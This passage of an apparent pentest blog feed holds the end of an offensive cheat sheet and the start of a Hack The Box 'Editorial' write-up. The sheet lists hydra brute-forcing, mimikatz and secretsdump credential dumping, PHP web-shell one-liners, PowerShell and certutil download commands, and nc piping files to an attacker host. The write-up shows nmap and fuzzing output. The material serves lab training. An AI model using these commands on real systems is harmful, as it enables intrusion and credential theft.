+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====</span> Vhost Discovery:
+</span></span><span style="display:flex;"><span>ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://board.htb -H <span style="color:#e6db74">&#39;Host: FUZZ.board.htb&#39;</span> -fs 15949
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span>Nikto Scan
+</span></span><span style="display:flex;"><span>nikto -h $URL -p $PORT
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span>LFI Fuzzing:
+</span></span><span style="display:flex;"><span>wfuzz -c -z file,/opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt <span style="color:#e6db74">&#34;</span>$URL<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span>Wordpress
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enumerate users</span>
+</span></span><span style="display:flex;"><span>wpscan --url $URL --api-token &lt;api_tok&gt; -e u
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enumerate vuln themes/plugins/users</span>
+</span></span><span style="display:flex;"><span>wpscan --url $URL --api-token &lt;api_tok&gt; -e vt,vp,u
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># If we have a username, we can try to brute force the login</span>
+</span></span><span style="display:flex;"><span>wpscan --url $URL --password-attack wp-login -U user.txt -P /usr/share/wordlists/rockyou.txt   
+</span></span><span style="display:flex;"><span>-----------------------SMTP-------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span>SMTP USER ENUM:
+</span></span><span style="display:flex;"><span>smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
+</span></span><span style="display:flex;"><span>smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
+</span></span><span style="display:flex;"><span>smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------------Brute Force------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Hydra</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span>SSH Login with user/pass file:
+</span></span><span style="display:flex;"><span>hydra -C creds ssh://$IP
+</span></span><span style="display:flex;"><span>hydra -C /opt/SecLists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://$IP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span>FTP Login with user/pass file:
+</span></span><span style="display:flex;"><span>hydra -C /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span>Postgres login with user/pass file:
+</span></span><span style="display:flex;"><span>hydra -C /opt/SecLists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt postgres://$IP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span>MySql login with user/pass file:
+</span></span><span style="display:flex;"><span>hydra -C /opt/SecLists/Passwords/mysql-betterdefaultpasslist.txt mysql://$IP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span>SSH login with known user
+</span></span><span style="display:flex;"><span>hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://$IP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span>HTTP Post Form
+</span></span><span style="display:flex;"><span>hydra -l $USER -P /usr/share/wordlists/rockyou.txt $IP http-post-form <span style="color:#e6db74">&#34;&lt;URL endpoint&gt;:&lt;PARAMS&gt;:F=&lt;failure message&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------------WINDOWS DOWNLOAD FILES------------------------------------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execution Bypass</span>
+</span></span><span style="display:flex;"><span>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>iwr -uri &lt;url&gt; -Outfile &lt;filename&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>powershell.exe <span style="color:#f92672">(</span>New-Object System.Net.WebClient<span style="color:#f92672">)</span>.DownloadFile<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;http://192.168.1.2/exploit.exe&#39;</span>, <span style="color:#e6db74">&#39;exploit.exe&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>certutil.exe -urlcache -f http://$MY_IP/$file $file
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Download multiple files on a box</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#multi_file.ps1</span>
+</span></span><span style="display:flex;"><span>$baseUrl <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://&lt;ip&gt;/&#34;</span>
+</span></span><span style="display:flex;"><span>$fileNames <span style="color:#f92672">=</span> @<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;file1.txt&#34;</span>, <span style="color:#e6db74">&#34;file2.txt&#34;</span>, <span style="color:#e6db74">&#34;file3.txt&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$downloadPath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;C:\Windows\Tasks&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>foreach <span style="color:#f92672">(</span>$fileName in $fileNames<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>	$url <span style="color:#f92672">=</span> $baseUrl + $fileName
+</span></span><span style="display:flex;"><span>	$filepath <span style="color:#f92672">=</span> Join-Path $downloadPath $fileName
+</span></span><span style="display:flex;"><span>	Invoke-WebRequest -Uri $url -OutFile $filePath
+</span></span><span style="display:flex;"><span>	Write-Host <span style="color:#e6db74">&#34;Downloaded </span>$fileName<span style="color:#e6db74"> to </span>$filePath<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--------------------WINDOWS ENUMERATION-------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get System info</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>systeminfo
+</span></span><span style="display:flex;"><span>systeminfo | findstr /b /C:<span style="color:#e6db74">&#34;OS Name&#34;</span> /C<span style="color:#e6db74">&#34;OS Version&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get installed updates</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wmic qfe get Caption, Description
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># User ENUMERATION</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check user privs</span>
+</span></span><span style="display:flex;"><span>whoami /priv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check user groups</span>
+</span></span><span style="display:flex;"><span>whoami /groups
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># View all users</span>
+</span></span><span style="display:flex;"><span>net users
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># List User groups</span>
+</span></span><span style="display:flex;"><span>net localgroup
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Find Passwords</span>
+</span></span><span style="display:flex;"><span>findstr /si password *.txt *.ini *.config
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------------------------------------WINDOWS CONT<span style="color:#e6db74">&#39;d----------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">===Crackmapexec:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">protocols:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  available protocols
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  {ssh,ldap,winrm,ftp,rdp,smb,mssql}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ssh                 own stuff using SSH
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldap                own stuff using LDAP
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    winrm               own stuff using WINRM
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ftp                 own stuff using FTP
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    rdp                 own stuff using RDP
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    smb                 own stuff using SMB
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mssql               own stuff using MSSQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Check for auth with a NTLM hash
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">crackmapexec smb 10.11.1.20-24 -u administrator -H ee0c207898a5bccc01f38115019ca2fb
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Password
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">crackmapexec smb 10.11.1.20-24 -u administrator -p &lt;password&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">===PsExec.py:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">python3 psexec.py administrator@10.5.5.30 -dc-ip 10.5.5.30
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">===Mimikatz:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">token::elevate
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">privilege::debug
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">log
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sekurlsa::logonpasswords
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lsadump::sam
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lsadump::secrets
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lsadump::cache
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">===Secretsdump.py:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># when you have the sam/system locally
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">python3 secretsdump.py -sam SAM -system SYSTEM LOCAL      
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># remote with pass
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">python3 secretsdump.py administrator@192.168.190.141
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># remote with hash
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">python3 secretsdump.py administrator@192.168.190.141 -k &lt;hash&gt;                                                                                  2 ⨯
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">-------------------------------------------Log Poisoning-------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># If there&#39;</span>s an LFI, check <span style="color:#66d9ef">for</span> access to log files <span style="color:#f92672">(</span>apache/nginx<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Attempt to add a php code execution parameter</span>
+</span></span><span style="display:flex;"><span>nc -nv $IP &lt;port&gt;
+</span></span><span style="display:flex;"><span>GET /&lt;?php passthru<span style="color:#f92672">(</span>$_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;fish&#39;</span><span style="color:#f92672">])</span>;?&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------------------------------PHP Code Executions---------------------------------------
+</span></span><span style="display:flex;"><span>&lt;?php passthru<span style="color:#f92672">(</span>$_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;cmd&#39;</span><span style="color:#f92672">])</span>; ?&gt;
+</span></span><span style="display:flex;"><span>&lt;?php system<span style="color:#f92672">(</span>$_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;cmd&#39;</span><span style="color:#f92672">])</span>; ?&gt;
+</span></span><span style="display:flex;"><span>&lt;?php shell_exec<span style="color:#f92672">(</span>$_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;cmd&#39;</span><span style="color:#f92672">])</span>; ?&gt;
+</span></span><span style="display:flex;"><span>&lt;?php exec<span style="color:#f92672">(</span>$_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;cmd&#39;</span><span style="color:#f92672">])</span>; ?&gt;
+</span></span><span style="display:flex;"><span>&lt;?php pOpen<span style="color:#f92672">(</span>$_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;cmd&#39;</span><span style="color:#f92672">])</span>; ?&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------------------------Linux Manual Priv Esc Enum-----------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check for where we can live, what folders we can write to</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check for interesting folder in /</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check for root processes</span>
+</span></span><span style="display:flex;"><span>ps aux | grep -i <span style="color:#e6db74">&#39;root&#39;</span> --color<span style="color:#f92672">=</span>auto
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check network connections, pay attention to 127.0.0.1 addresses</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># netstat -antup</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check /etc/ directory for misconfigurations... i.e things not root:root/root:shadow</span>
+</span></span><span style="display:flex;"><span>ls -ltra /etc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check /etc/passwd for write perms</span>
+</span></span><span style="display:flex;"><span>ls -ltra /etc/passwd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check /var/mail</span>
+</span></span><span style="display:flex;"><span>ls -ltra /var/mail
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check for suid/guid binaries</span>
+</span></span><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>find / -perm -g<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check sudo privs </span>
+</span></span><span style="display:flex;"><span>sudo -l
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check cronjobs</span>
+</span></span><span style="display:flex;"><span>cat /etc/crontab
+</span></span><span style="display:flex;"><span>ls -lah /etc/cron*
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enumerate OS and arch</span>
+</span></span><span style="display:flex;"><span>cat /etc/issue
+</span></span><span style="display:flex;"><span>cat /etc/*-release
+</span></span><span style="display:flex;"><span>uname -a
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check installed applications</span>
+</span></span><span style="display:flex;"><span>dpkg -l
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Writable files</span>
+</span></span><span style="display:flex;"><span>find / -writable -type d 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Mountable volumes</span>
+</span></span><span style="display:flex;"><span>cat /etc/fstab
+</span></span><span style="display:flex;"><span>mount
+</span></span><span style="display:flex;"><span>/bin/lsblk
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Device drivers / modules</span>
+</span></span><span style="display:flex;"><span>lsmod
+</span></span><span style="display:flex;"><span>/sbin/modinfo libata
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--------------------------Tunneling--------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Chisel socks proxy</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># kali</span>
+</span></span><span style="display:flex;"><span>./chisel_arm64 server --reverse --port <span style="color:#ae81ff">443</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># victim</span>
+</span></span><span style="display:flex;"><span>chisel.exe client 192.168.45.247:443 R:socks
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--------------------------WEB--------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Check for XFF if we can add an input</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------------nc-----------------------
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send file with nc</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## On local host </span>
+</span></span><span style="display:flex;"><span>nc -l -p <span style="color:#ae81ff">1234</span> -q <span style="color:#ae81ff">1</span> &gt; <span style="color:#960050;background-color:#1e0010">&#39;</span>&lt;filename&gt; &lt; /dev/null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## on remote host</span>
+</span></span><span style="display:flex;"><span>cat &lt;filename&gt; | nc &lt;kali ip&gt; <span style="color:#ae81ff">1234</span>
+</span></span></code></pre></div>]]></content>
+        </item>
+        
+        <item>
+            <title>Editorial</title>
+            <link>http://localhost:1313/posts/editorial/</link>
+            <pubDate>Sat, 24 Aug 2024 16:50:47 -0400</pubDate>
+            
+            <guid>http://localhost:1313/posts/editorial/</guid>
+            <description>HTB - Linux - Easy</description>
+            <content type="html"><![CDATA[<h1 id="enum">Enum</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/editorial<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -p- -T5 -oN all-ports.nmap $IP
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/editorial<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -p22,80 -A -oN service-scan.nmap $IP        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-22 13:57 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.20
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.026s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://editorial.htb
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h1 id="80">80</h1>
+<p>Began scan with whatweb</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/editorial<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ whatweb $IP
+</span></span><span style="display:flex;"><span>http://10.10.11.20 <span style="color:#f92672">[</span><span style="color:#ae81ff">301</span> Moved Permanently<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.10.11.20<span style="color:#f92672">]</span>, RedirectLocation<span style="color:#f92672">[</span>http://editorial.htb<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span><span style="color:#ae81ff">301</span> Moved Permanently<span style="color:#f92672">]</span>, nginx<span style="color:#f92672">[</span>1.18.0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>ERROR Opening: http://editorial.htb - no address <span style="color:#66d9ef">for</span> editorial.htb
+</span></span></code></pre></div><p>Need to add to hosts file and try again:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/editorial<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ whatweb http://editorial.htb
+</span></span><span style="display:flex;"><span>http://editorial.htb <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Bootstrap, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.10.11.20<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span>Editorial Tiempo Arriba<span style="color:#f92672">]</span>, X-UA-Compatible<span style="color:#f92672">[</span>IE<span style="color:#f92672">=</span>edge<span style="color:#f92672">]</span>, nginx<span style="color:#f92672">[</span>1.18.0<span style="color:#f92672">]</span>
+</span></span></code></pre></div><h3 id="fuzzing-dirs">Fuzzing Dirs</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/editorial<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ URL<span style="color:#f92672">=</span>http://editorial.htb/FUZZ
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/editorial<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc <span style="color:#ae81ff">404</span> <span style="color:#e6db74">&#34;</span>$URL<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://editorial.htb/FUZZ
+</span></span><span style="display:flex;"><span>Total requests: 62283
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                                            
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000088:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">209</span> L    <span style="color:#ae81ff">537</span> W      <span style="color:#ae81ff">7134</span> Ch     <span style="color:#e6db74">&#34;upload&#34;</span>                                                                           
+</span></span><span style="display:flex;"><span>000000126:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">71</span> L     <span style="color:#ae81ff">232</span> W      <span style="color:#ae81ff">2938</span> Ch     <span style="color:#e6db74">&#34;about&#34;</span>                                                                            
+</span></span><span style="display:flex;"><span>000004255:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">176</span> L    <span style="color:#ae81ff">589</span> W      <span style="color:#ae81ff">8562</span> Ch     <span style="color:#e6db74">&#34;http://editorial.htb/&#34;</span>                                                            
+</span></span><span style="display:flex;"><span>000030014:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">176</span> L    <span style="color:#ae81ff">589</span> W      <span style="color:#ae81ff">8562</span> Ch     <span style="color:#e6db74">&#34;http://editorial.htb/&#34;</span>                                                            
+</span></span><span style="display:flex;"><span>000059103:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">176</span> L    <span style="color:#ae81ff">589</span> W      <span style="color:#ae81ff">8562</span> Ch     <span style="color:#e6db74">&#34;http://editorial.htb/&#34;</span>  
+</span></span></code></pre></div><p>Upload directory is the most interesting.</p>
+<p>Browsing directly to the web page gives another possible hostname we can add to our hosts file.
+<em>Doesn&rsquo;t lead anywhere</em></p>
+<p><code>tiempoarriba.htb</code></p>
+<h4 id="upload-directory">Upload Directory</h4>
+<p>A couple possible options to abuse, there&rsquo;s a search function, we can upload a &ldquo;preview&rdquo;, and we may be able to include a URL.</p>
+<p>The send book function isn&rsquo;t all that interesting as it doesn&rsquo;t send anything we can work with. The <code>preview</code> option is interesting as we can submit an URL and see it perform a GET request using python.</p>
+<p>Sending a request and picking it up on our python server:</p>
+<p>The response also returns something different if it&rsquo;s successful or not, unsuccuessful requests return a URL in /static/images containing unsplash.</p>
+<p>Successful requests point to a /static/uploads file that we can download and view</p>
+<p>We&rsquo;re not able execute code directly, but we can use ffuf to enumerate any other listening ports we don&rsquo;t have access to via the web server on port 80.</p>
